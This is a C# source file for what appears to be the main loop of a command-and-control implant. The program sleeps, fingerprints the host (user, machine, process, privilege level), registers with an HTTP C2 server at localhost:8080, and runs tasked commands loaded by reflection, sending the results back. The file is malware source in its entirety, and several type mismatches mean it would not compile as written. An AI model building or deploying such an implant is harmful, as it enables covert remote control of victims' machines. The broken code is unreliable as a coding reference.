using Agent.Models;
using System.Diagnostics;
using System;
using System.Collections.Generic;
using System.Security.Principal;
using System.Net.Http.Headers;
using System.Threading;
using System.Collections;
using System.Collections.Generic;
using System.Reflection;
using System.Linq;

namespace Agent
{
     class Program
    { 
        private static AgentMetadata _metadata ;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        private static List<AgentsCommand> _commands =new List<AgentCommand>() ;
        static void Main(string[] args)
        {
            Thread.Sleep(20000);
            GenerateMetadata();
            LoadAgentCommands();
            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();
            while (!_tokenSource.IsCancellationRequested)
            {

                if (_commModule.RecvData(out var tasks)){
                    HandleTasks(tasks);

                }
            }

        }
        private static void HandleTasks(IEnumerable<AgentTask> tasks)
        {

            foreach (var task in tasks)
            {
                HandleTask(task);
            }
        }
        private static void HandleTask(AgentTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
            if (command is null) {

                SendTaskResult(task.Id, "Command not found .");
                return;
            
            
            } ;

            try
            {
                var result = command.Execute(task);
                SendTaskResult(task.Id, result);

            }
            catch (Exception e) {
                SendTaskResult(task.Id, e.Message);

            }
            

        }
        private static  void SendTaskResult(string taskId,string result)
        {
            var taskResult = new AgentTaskResult
            {
                Id = taskId,
                Result = result
            };

            _commModule.SendData(taskResult);

        }
        public void stop() {

            _tokenSource.Cancel();
        }

        private static void LoadAgentCommands()
        {
        var self= Assembly.GetExecutingAssembly();
            foreach (var type in self.GetTypes())
            {

                if (type.IsSubclassOf(typeof(AgentsCommand)))
                {
                    var instance = Activator.CreateInstance(type);
                    _commands.Add(instance);

                }
            }
        }
       private  static void GenerateMetadata(){
            var username = Environment.UserName;
            var process = Process.GetCurrentProcess();
            string integrity ="Medium";
            if (username.Equals("SYSTEM"))
                integrity = "SYSTEM";

            using (var identity = WindowsIdentity.GetCurrent()){

                if (identity.User != identity.Owner)
                {
                    integrity = "High"; } }
            
            
            _metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = username,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = integrity,
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86" 
            };


        
        }


    }
}
